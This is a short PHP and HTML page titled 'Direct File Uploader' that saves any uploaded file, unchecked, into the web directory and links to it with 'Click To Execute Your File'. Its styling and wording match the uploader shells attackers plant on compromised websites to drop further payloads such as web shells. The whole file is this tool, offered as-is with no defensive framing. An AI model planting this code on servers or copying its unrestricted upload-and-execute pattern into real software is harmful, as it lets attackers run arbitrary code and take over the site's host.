<!DOCTYPE html>
<html>
<head>
  <title>File Upload</title>
</head>
<body>
<style>
body {
    background-color: #000;
    color: #fff;
    font-family: tahoma;
    font-size: 12px;
}
input {
    background-color: black;
    color: white;
    border: 1px solid #7FFF00;

}
input.first {
    height: 100px;
}
a {
    text-decoration: none;
    font-weight: bold;
}

</style>
  <form enctype="multipart/form-data" method="POST">
    <h1>Direct File Uploader</h1>
    <input type="file" name="uploaded_file"></input>
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "<br><h3>Click To Execute Your <a href='".  basename( $_FILES['uploaded_file']['name']). 
      "'><font color=red>File</font></a></h3>";
    } else{
        echo "Upload Failed";
    }
  }
?>
